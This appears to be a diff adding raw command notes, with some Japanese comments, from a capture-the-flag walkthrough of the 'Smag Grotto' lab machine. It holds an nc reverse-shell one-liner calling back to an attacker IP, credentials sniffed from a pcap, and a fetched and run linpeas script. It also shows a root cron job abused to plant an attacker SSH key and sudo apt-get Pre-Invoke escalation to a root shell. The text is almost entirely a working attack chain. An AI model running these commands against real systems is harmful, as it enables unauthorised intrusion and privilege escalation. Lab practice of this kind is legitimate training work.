@@ -1,0 +1,78 @@
+nmap -sC -sV -oN nmap.log 10.48.155.27
+gobuster dir -u http://10.48.155.27:80 -w /usr/share/wordlists/dirb/big.txt -x php -t 50 | tee gobuster.log
+
+wireshark
+
+wireshark dHJhY2Uy\(1\).pcap
+
+--
+HTTP/1.1 200 OK
+
+POST /login.php HTTP/1.1
+Host: development.smag.thm
+User-Agent: curl/7.47.0
+Accept: */*
+Content-Length: 39
+Content-Type: application/x-www-form-urlencoded
+username=helpdesk&password=cH4nG3M3_n0w
+HTTP/1.1 200 OK
+Date: Wed, 03 Jun 2020 18:04:07 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Content-Length: 0
+Content-Type: text/html; charset=UTF-8
+
+
+/etc/hosts
+10.49.190.140 development.smag.thm
+
+tcpdump -i tun0 icmp
+
+kali@kali:~/thm/smaggrotto$ cp /usr/bin/nc .
+
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.141.239 1234 >/tmp/f
+
+nc -lnvp 1234
+
+drwx------ 2 jake jake 4096 Jun  4  2020 .ssh
+-rw-rw---- 1 jake jake   33 Jun  4  2020 user.txt
+
+
+# linpeas.shをダウンロード
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
+
+# HTTP サーバー起動（ファイルのあるディレクトリで）
+python3 -m http.server 8000
+
+# シェルが取れたら、ターゲット側で
+cd /tmp
+wget http://192.168.141.239:8000/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+
+*  *    * * *   root    /bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
+
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC5HGAnm2nNgzDW9OPAZ9dP0tZbvNrIJWa/swbWX1dogZPCFYn8Ys3P7oNPyzXS6ku72pviGs5kQsxNWpPY94bt2zvd1J6tBw5g64ox3BhCG4cUvuI5zEi7y+xnIiTs5/MoF/gjQ2IdNDdvMs/hDj4wc2x8TFLPlCmR1b/uHydkuvdtw9WzZN1O+Ax3yEkMfB8fO3F7UqN2798wBPpRNNysQ+59zIUbV9kJpvARBILjIupikOsTs8FMMp2Um6aSpFKWzt15na0vou0riNXDTgt6WtPYxmtv1AHE4VdD6xFJrM5CGffGbYEQjvJoFX2+vSOCDEFZw1SjuajykOaEOfheuY96Ao3f41m2Sn7Y9XiDt1UP4/Ws+kxfpX2mN69+jsPYmIKY72MSSm27nWG3jRgvPZsFgFyE00ZTP5dtrmoNf0CbzQBriJUa596XEsSOMmcjgoVgQUIr+WYNGWXgpH8G+ipFP/5whaJiqPIfPfvEHbT4m5ZsSaXuDmKercFeRDs= kali@kali
+
+ssh-keygen -t rsa
+
+
+cat > /opt/.backups/jake_id_rsa.pub.backup << 'EOF'
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCszBL00e5wenjReb/S5898MMgwBJsMeOteTMidMDy8zjBq47opBuDwcuf6GPDpGp6+EXddpI/0WmIwwSxV8uhhuxwl6QOaDYUaNYxvLXkitygmPtVvMj7wZlHQvy5cxAaRwm1+6SjUPmUF3clTgE6RBbUdMVR3nXMeNQIGbrn7qsxZN/yFegFoshFvtkRb7lktKasbdwVLYnWsI1YyPVR9qh0dptgNZA4guUzQuj60t9MKSZRe4utRsDyxMorKZK+GZ1wEV6xx185v0HV22c7TWomjtACz6ENonGXUaqsKaus7ieXOnnwr495t/xqKuEm+A43ac+MijHA6LEK5AtHEDwsC2Cmzzxb+dpOvJGTAj62OumUpb0FYfe9bjTIVdETEyE8IRGgNGiD99u8cXnslIxfpJhBZlByaDRaThKrD3XqHGoOlR7+B/VVspfhmBI6CW7Ys4OT9xZv6ZRSHf0BgV1KbqaQKM9ELPzVjelYLonXadUUfUbz5mcjyy4sMqp8= kali@kali
+EOF
+
+ssh -i /home/kali/.ssh/id_rsa jake@development.smag.thm
+
+jake@smag:/home$ sudo -l
+Matching Defaults entries for jake on smag:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jake may run the following commands on smag:
+    (ALL : ALL) NOPASSWD: /usr/bin/apt-get
+
+sudo apt-get update -o APT::Update::Pre-Invoke:=/bin/sh
+
+
+
+sudo apt-get autoremove -o DPkg::Pre-Invoke::="/bin/bash"
